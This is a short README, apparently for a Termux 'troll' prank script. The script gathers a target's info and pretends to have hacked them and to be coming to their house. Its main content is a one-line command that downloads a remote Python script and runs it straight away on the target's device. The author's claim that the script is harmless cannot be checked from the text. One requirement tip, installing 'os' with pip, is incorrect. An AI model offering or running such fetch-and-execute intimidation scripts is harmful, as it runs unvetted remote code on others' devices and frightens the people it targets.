# whats that?

oh hey! that will do like if you execute it gets your info and pretending that script hacked the target and coming to his house and dont worry the info wont be sent to me

probably the most common I guess?

And as always, its harmless.

# Command

```bash
wget https://raw.githubusercontent.com/revx0012/troll-termux/main/scripts/code/code.py && python3 code.py
```

# Requirements


Make sure the target has installed python, if you dont know just do ```python3``` or ```python``` and if it says anything it means it has been installed
or if it says not installed just do ```apt -y install python3 python-pip```

Also, if it says ```Module not found 'requests'``` just do ```pip3 install requests```

Or if it say ```Module not found 'os'``` do ```pip3 install os```
